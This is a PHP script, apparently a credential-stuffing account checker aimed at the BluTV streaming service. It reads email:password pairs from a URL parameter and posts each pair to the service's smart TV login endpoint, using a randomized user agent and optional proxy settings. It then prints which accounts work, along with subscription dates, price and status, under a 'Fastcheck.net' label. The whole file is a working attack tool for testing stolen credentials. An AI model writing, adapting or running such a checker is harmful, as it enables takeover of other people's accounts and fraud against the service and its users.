<?php

ini_set("display_errors", 0);
error_reporting(0);

@session_start();

$lista = htmlspecialchars($_GET['lista']);
$array = explode(":", $lista);

$mail = trim($array[0]);
$pass = trim($array[1]);

$min = 100;
$max = 999;

$random1 = rand($min, $max);
$random2 = rand($min, $max);
$url = 'https://smarttv.blutv.com.tr/actions/account/login';
//$proxyauth = 'user:password';
$agent = 'Mozilla/5.0 (Linux; Tizen 2.3) AppleWebKit/' . $random1 . '.1 (KHTML, like Gecko)Version/2.3 TV Safari/' . $random2 . '.1';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt(
    $ch,
    CURLOPT_POSTFIELDS,
    "username=$mail&password=$pass&platform=com.blu.smarttv"
);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
$curl_scraped_page = curl_exec($ch);
function Capture($str, $starting_word, $ending_word)
{
    $subtring_start  = strpos($str, $starting_word);
    $subtring_start += strlen($starting_word);
    $size            = strpos($str, $ending_word, $subtring_start) - $subtring_start;
    return substr($str, $subtring_start, $size);
};
$fim = json_decode($curl_scraped_page, true);
if ($fim['status'] == 'ok') {
    $startdate = Capture($curl_scraped_page, 'StartDate":"', '",');
    $enddate = Capture($curl_scraped_page, 'EndDate":"', '",');
    $price = Capture($curl_scraped_page, 'Price":"', '",');
    $accountstate = Capture($curl_scraped_page, 'AccountState":"', '",');
    switch ($accountstate) {
        case 'Active':
            $accountstate = "AKTİF";
            echo "✅ <b>#Aktif</b> - $mail : $pass - Başlangıç Tarihi: $startdate - Bitiş Tarihi: $enddate - Ücret: $price - Hesap Durum: $accountstate - <b>www.Fastcheck.net</b> <br>";
            break;
        case 'Suspend':
            $accountstate = "DURDURULMUŞ";
            echo "✅ <b>#Aktif</b> - $mail : $pass - Başlangıç Tarihi: $startdate - Bitiş Tarihi: $enddate - Ücret: $price - Hesap Durum: $accountstate - <b>www.Fastcheck.net</b> <br>";
            break;
        case 'Canceled':
            $accountstate = "KAPANMIŞ";
            echo "✅ <b>#Aktif</b> - $mail : $pass - Başlangıç Tarihi: $startdate - Bitiş Tarihi: $enddate - Ücret: $price - Hesap Durum: $accountstate - <b>www.Fastcheck.net</b> <br>";
            break;
        case 'None';
            $accountstate = "CUSTOM";
            echo "✅ <b>#Aktif</b> - $mail : $pass - Hesap Durum: $accountstate <b>www.Fastcheck.net</b> <br>";
            return $accountstate;
    }
} else {
    echo "❌ <b>#Kapalı</b> - $mail : $pass <b>www.Fastcheck.net</b> <br>";
}
curl_close($ch);
